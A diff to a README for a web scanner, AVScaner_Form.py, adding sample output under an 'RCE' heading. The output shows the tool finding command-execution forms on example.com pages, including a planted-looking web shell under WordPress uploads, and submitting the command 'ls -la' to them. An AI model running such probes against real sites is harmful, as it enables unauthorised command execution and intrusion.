@@ -72,6 +72,32 @@ python AVScaner_Form.py -c 10 -v -i "input_data/crawled_final.txt" -p "wordlist/
 ### RCE
 
 ```bash
+python AVScaner_Form.py -c 5
+
+[*] Starting @ 22:49:39 2024-09-03
+[*] Total number of payload variants per link: 18
+
+
+13/18 🐸  
+[+] URL: http://example.com/wp-content/uploads/2024/08/404.php | Status: 200
+<form method="GET" name="404.php">
+<input id="cmd" name="cmd" size="80" type="TEXT"/>
+<input type="SUBMIT" value="Execute"/>
+</form>
+{'cmd': 'ls -la'}
+
+17/18 🐦  
+[+] URL: http://example.com/equipments/adapter | Status: 200
+<form method="GET" name="index.php">
+<input id="cmd" name="cmd" size="80" type="TEXT"/>
+<input type="SUBMIT" value="iQ Freeze"/>
+</form>
+{'cmd': 'ls -la'}
+
+18/18 🐵  
+
+[*] Finished @ 22:49:47 2024-09-03
+[*] Duration: 0:00:08.334356
 
 ```
 
